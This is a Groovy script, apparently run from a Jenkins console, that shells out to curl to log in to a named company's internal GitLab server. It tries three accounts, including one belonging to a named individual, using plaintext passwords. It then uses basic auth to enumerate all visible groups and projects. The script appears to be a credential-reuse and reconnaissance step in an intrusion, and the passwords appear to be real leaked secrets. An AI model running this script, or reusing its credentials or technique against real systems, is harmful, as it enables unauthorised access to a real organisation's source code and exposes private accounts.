// MICRO-I: Get GitLab token + list all groups/projects
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(3000)
}

// Session via hostname
println "=== SESSION jenkins (hostname) ==="
def r1 = run('curl -sk -X POST "https://gitlab.dev.claroshop.com/api/v4/session" -H "Content-Type: application/json" -d \'{"login":"jenkins","password":"e6LBqIkOI$PR1XX2oia"}\' --max-time 8')
println r1

println "\n=== SESSION jenkins_legacy ==="
def r2 = run('curl -sk -X POST "https://gitlab.dev.claroshop.com/api/v4/session" -H "Content-Type: application/json" -d \'{"login":"jenkins_legacy","password":"JenkisLegasy25"}\' --max-time 8')
println r2

println "\n=== SESSION maria.policarpo ==="
def r3 = run('curl -sk -X POST "https://gitlab.dev.claroshop.com/api/v4/session" -H "Content-Type: application/json" -d \'{"login":"maria.policarpo","password":"FtMRl4fDXzIDY4Yj"}\' --max-time 8')
println r3

// List groups visible to jenkins
println "\n=== GROUPS (jenkins basic auth) ==="
def r4 = run('curl -sk -u "jenkins:e6LBqIkOI\$PR1XX2oia" "https://gitlab.dev.claroshop.com/api/v4/groups?per_page=50" --max-time 10')
println r4

// Try claroshop group directly
println "\n=== GROUP claroshop projects ==="
def r5 = run('curl -sk -u "jenkins:e6LBqIkOI\$PR1XX2oia" "https://gitlab.dev.claroshop.com/api/v4/groups/claroshop/projects?per_page=50" --max-time 10')
println r5

println "\n=== DONE MICRO-I ==="
